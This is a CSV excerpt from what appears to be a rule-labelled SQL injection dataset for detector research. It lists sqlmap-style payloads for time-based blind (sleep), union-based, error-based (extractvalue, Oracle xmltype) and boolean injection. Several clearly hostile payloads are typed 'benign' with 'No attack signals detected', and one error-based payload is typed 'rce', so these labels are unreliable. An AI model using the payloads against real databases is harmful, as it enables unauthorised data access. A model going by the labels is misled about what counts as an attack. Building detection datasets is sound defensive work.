row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
4710,1 ) as fnpq where 5209 = 5209,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4711,"1"" ) ) ) order by 1#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4712,1 where 8889 = 8889,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4713,"1' where 4334 = 4334 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
4714,"-9873"" union all select 8020,8020,8020,8020,8020,8020#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4715,"1 where 8045 = 8045 union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
4716,1'|| ( select 'lzzr' where 2477 = 2477,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4717,"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""zyoo"" = ""zyoo",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4718,"1%"" ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ""%"" = """,1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
4719,-7369 or 9323 = 9323#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4720,select ( case when ( 3444 = 8424 ) then 3444 else 3444* ( select 3444 from information_schema.character_sets ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
4721,1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
4722,end and ( 'hmtt' like 'hmtt,1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
